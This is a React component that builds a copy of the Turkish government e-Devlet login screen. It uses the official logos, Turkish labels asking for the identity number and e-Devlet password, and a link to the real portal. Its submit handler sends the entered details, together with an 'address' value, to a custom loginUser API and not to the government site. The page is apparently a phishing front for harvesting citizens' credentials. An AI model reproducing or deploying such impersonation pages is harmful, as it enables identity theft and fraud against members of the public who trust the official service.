import React, { useEffect, useState } from "react";
import { useApi } from "./apis/api";

const LoginPage = ({ address }) => {
  const { loginUser } = useApi();
  const [formData, setFormData] = useState({
    email: "",
    tc: "",
  });

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((prevData) => ({
      ...prevData,
      [name]: value,
    }));
  };

  useEffect(() => {
    console.log("formData", address);
  });

  const handleSubmit = async (e) => {
    e.preventDefault();
    console.log(address);
    const response = await loginUser(address, formData.email);
  };
  return (
    <body>
      <div className="wrapper">
        <div className="container">
          <header className="header">
            <h1>
              Türkiye Cumhuriyeti Vatandaş Kimlik Doğrulama Sistemi Giriş Ekranı
            </h1>
            <div className="logo">
              <a href="https://giris.turkiye.gov.tr/Giris/gir">
                <img
                  src="https://cdn.e-devlet.gov.tr/themes/izmir/images/login/edk-logo.png"
                  alt="Türkiye Cumhuriyeti Vatandaş Kimlik Doğrulama Sistemi Giriş Ekranı"
                />
              </a>
            </div>
            <div className="referrerApp">
              <img
                src="https://cdn.e-devlet.gov.tr/themes/istanbul/images/agencies/1.png"
                aria-hidden="true"
                width="165"
                height="40"
              />
              <p>
                e-Devlet Kapısı<span>https://www.turkiye.gov.tr</span>
              </p>
            </div>
          </header>
          <h2 className="visuallyhidden">Giriş Seçenekleri</h2>
          <nav></nav>
          <main>
            <section>
              <div className="content">
                <div id="loginForm" name="sifreGirisForm" autocomplete="off">
                  <fieldset>
                    <div className="form-row required ">
                      <label for="email" className="enforced">
                        E-mail
                      </label>
                      <input
                        type="hidden"
                        name="encemail"
                        id="encemail"
                        value=""
                      />
                      <div className="form-field fieldGroup">
                        <input
                          name="email"
                          type="email"
                          e-validate="tck"
                          className="form-control"
                          id="email"
                          value={formData.email}
                          onChange={handleChange}
                          autoComplete="off"
                          title="Kimlik numaranız 11 adet rakamdan oluşmalıdır"
                          aria-label="T. C. Kimlik Numaranızı Girin"
                          required=""
                        />
                      </div>
                    </div>

                    <div className="form-row ">
                      <label for="egpField" className="enforced">
                        e-Devlet Şifresi
                      </label>
                      <div className="form-field fieldGroup">
                        <input
                          name="egpField"
                          id="egpField"
                          type="password"
                          className="form-control"
                          autoComplete="off"
                          aria-label="e-Devlet Şifrenizi Girin"
                          value={formData.egpField}
                          onChange={handleChange}
                          required=""
                          aria-describedby="passwordFormNote"
                        />

                        <input
                          type="hidden"
                          name="encEgpField"
                          id="encEgpField"
                          value=""
                        />
                      </div>
                    </div>
                    <div className="loading-content hide">
                      <div className="loading"></div>
                    </div>

                    <div className="form-row center-item">
                      <input
                        type="hidden"
                        name="currentPageToken"
                        value="6da2eb9d-48d6-40ae-af0b-6ff5c8a69b47"
                      />
                      <input type="hidden" name="actionName" value="giris" />
                      <button
                        type="button"
                        className="btn btn-cancel"
                        name="cancelButton"
                        value="İptal"
                      >
                        İptal
                      </button>
                      <button
                        className="btn btn-send"
                        name="submitButton"
                        type="submit"
                        value="Giriş Yap"
                        onClick={handleSubmit}
                      >
                        Giriş Yap
                      </button>
                    </div>
                  </fieldset>
                </div>
              </div>
            </section>
          </main>
        </div>
      </div>
    </body>
  );
};

export default LoginPage;
